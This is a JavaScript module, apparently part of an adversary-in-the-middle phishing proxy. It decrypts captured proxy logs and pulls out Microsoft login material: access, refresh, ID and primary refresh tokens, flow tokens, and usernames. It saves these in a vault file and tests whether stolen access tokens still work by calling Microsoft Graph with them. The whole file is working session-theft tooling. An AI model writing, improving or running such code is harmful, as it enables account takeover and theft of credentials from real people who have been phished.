// token_vault.js - Token Vault & Health Check
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

class TokenVault {
    constructor(logDir, encryptionKey) {
        this.logDir = logDir;
        this.encryptionKey = encryptionKey;
        this.vaultFile = path.join(logDir, '..', 'token_vault.json');
        this.tokens = [];
        this.load();
    }

    // Decrypt function (same as proxy)
    decryptData(encryptedData, ivHex) {
        const iv = Buffer.from(ivHex, 'hex');
        const decipher = crypto.createDecipheriv('aes-256-ctr', this.encryptionKey, iv);
        let decrypted = decipher.update(Buffer.from(encryptedData, 'hex'));
        decrypted = Buffer.concat([decrypted, decipher.final()]);
        return decrypted.toString('utf-8');
    }

    // Load existing vault
    load() {
        try {
            if (fs.existsSync(this.vaultFile)) {
                const data = fs.readFileSync(this.vaultFile, 'utf-8');
                this.tokens = JSON.parse(data);
            }
        } catch (e) {
            this.tokens = [];
        }
    }

    // Save vault
    save() {
        fs.writeFileSync(this.vaultFile, JSON.stringify(this.tokens, null, 2));
    }

    // Extract tokens from a log file
    extractTokens(logFilename) {
        const filePath = path.join(this.logDir, logFilename);
        if (!fs.existsSync(filePath)) return [];

        const content = fs.readFileSync(filePath, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const tokens = [];

        for (const line of lines) {
            try {
                const entry = JSON.parse(line);
                const iv = Object.keys(entry)[0];
                const encrypted = entry[iv];
                const decrypted = this.decryptData(encrypted, iv);
                const obj = JSON.parse(decrypted);

                const body = obj.proxyRequestBody || '';
                const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);

                // Extract tokens
                const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                const idMatch = bodyStr.match(/id_token=([^&]+)/i);
                const prtMatch = bodyStr.match(/primaryRefreshToken[=:]+([^&"',}]+)/i);
                const flowTokenMatch = bodyStr.match(/flowToken[=:]+([^&"',}]+)/i);

                // Extract username
                let username = 'Unknown';
                const userMatch = bodyStr.match(/(?:username|login|user|Email|loginfmt)=([^&]+)/i);
                if (userMatch) username = decodeURIComponent(userMatch[1]);

                if (accessMatch) {
                    tokens.push({
                        type: 'access_token',
                        value: decodeURIComponent(accessMatch[1]),
                        username: username,
                        sourceFile: logFilename,
                        timestamp: obj.timestamp || new Date().toISOString(),
                        status: 'unknown'
                    });
                }
                if (refreshMatch) {
                    tokens.push({
                        type: 'refresh_token',
                        value: decodeURIComponent(refreshMatch[1]),
                        username: username,
                        sourceFile: logFilename,
                        timestamp: obj.timestamp || new Date().toISOString(),
                        status: 'unknown'
                    });
                }
                if (idMatch) {
                    tokens.push({
                        type: 'id_token',
                        value: decodeURIComponent(idMatch[1]),
                        username: username,
                        sourceFile: logFilename,
                        timestamp: obj.timestamp || new Date().toISOString(),
                        status: 'unknown'
                    });
                }
                if (prtMatch) {
                    tokens.push({
                        type: 'prt',
                        value: decodeURIComponent(prtMatch[1]),
                        username: username,
                        sourceFile: logFilename,
                        timestamp: obj.timestamp || new Date().toISOString(),
                        status: 'unknown'
                    });
                }
                if (flowTokenMatch) {
                    tokens.push({
                        type: 'flow_token',
                        value: decodeURIComponent(flowTokenMatch[1]),
                        username: username,
                        sourceFile: logFilename,
                        timestamp: obj.timestamp || new Date().toISOString(),
                        status: 'unknown'
                    });
                }
            } catch (e) {}
        }

        return tokens;
    }

    // Scan all logs and update vault
    scanLogs() {
        const files = fs.readdirSync(this.logDir).filter(f => f.endsWith('.log'));
        const newTokens = [];

        for (const file of files) {
            const extracted = this.extractTokens(file);
            newTokens.push(...extracted);
        }

        // Merge with existing vault (avoid duplicates)
        const existingValues = new Set(this.tokens.map(t => t.value.substring(0, 20)));
        for (const token of newTokens) {
            const key = token.value.substring(0, 20);
            if (!existingValues.has(key)) {
                this.tokens.push(token);
                existingValues.add(key);
            }
        }

        this.save();
        return this.tokens;
    }

    // Check token health (test if token is still valid)
    async checkTokenHealth(token) {
        try {
            const axios = require('axios');
            const response = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${token.value}` }
            });
            return { valid: true, user: response.data.userPrincipalName };
        } catch (e) {
            if (e.response && e.response.status === 401) {
                return { valid: false, error: 'Expired' };
            }
            return { valid: false, error: e.message };
        }
    }

    // Health check all tokens
    async healthCheckAll() {
        const results = [];
        for (const token of this.tokens) {
            if (token.type === 'access_token') {
                const result = await this.checkTokenHealth(token);
                token.status = result.valid ? 'valid' : 'expired';
                token.healthChecked = new Date().toISOString();
                results.push({ token, result });
            }
        }
        this.save();
        return results;
    }

    // Get tokens grouped by user
    getTokensByUser() {
        const users = {};
        for (const token of this.tokens) {
            if (!users[token.username]) {
                users[token.username] = [];
            }
            users[token.username].push(token);
        }
        return users;
    }

    // Get statistics
    getStats() {
        const stats = {
            total: this.tokens.length,
            byType: {},
            byUser: {},
            valid: 0,
            expired: 0,
            unknown: 0
        };

        for (const token of this.tokens) {
            stats.byType[token.type] = (stats.byType[token.type] || 0) + 1;
            stats.byUser[token.username] = (stats.byUser[token.username] || 0) + 1;
            if (token.status === 'valid') stats.valid++;
            else if (token.status === 'expired') stats.expired++;
            else stats.unknown++;
        }

        return stats;
    }
}

module.exports = TokenVault;
